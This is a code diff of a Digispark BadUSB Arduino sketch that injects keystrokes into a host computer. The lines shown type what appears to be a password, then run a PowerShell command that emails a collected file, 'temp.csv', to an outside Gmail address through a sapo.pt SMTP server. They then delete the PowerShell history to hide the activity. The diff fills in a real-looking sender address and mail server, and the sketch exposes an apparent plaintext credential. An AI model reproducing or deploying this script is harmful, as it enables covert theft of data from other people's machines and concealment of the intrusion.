@@ -65,11 +65,11 @@ void loop() {
   DigiKeyboard.print(F("zyfcuk-zohzu3-cukpIz"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.print(F("Send-MailMessage -From '<username>'"));
+  DigiKeyboard.print(F("Send-MailMessage -From 'john.smith"));
   DigiKeyboard.sendKeyStroke(KEY_2, MOD_ALT_RIGHT);
   DigiKeyboard.print(F("sapo.pt' -to 'dk.fsgm"));
   DigiKeyboard.sendKeyStroke(KEY_2, MOD_ALT_RIGHT);
-  DigiKeyboard.print(F("gmail.com' -Subject 'Digispark Report' -Body 'Attached is your report.' -SmtpServer '<smtp-serveer>' -port 587 -UseSsl -Credential $credentials -Attachments 'temp.csv'"));  
+  DigiKeyboard.print(F("gmail.com' -Subject 'Digispark Report' -Body 'Attached is your report.' -SmtpServer 'smtp.sapo.pt' -port 587 -UseSsl -Credential $credentials -Attachments 'temp.csv'"));  
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);
   DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath"));
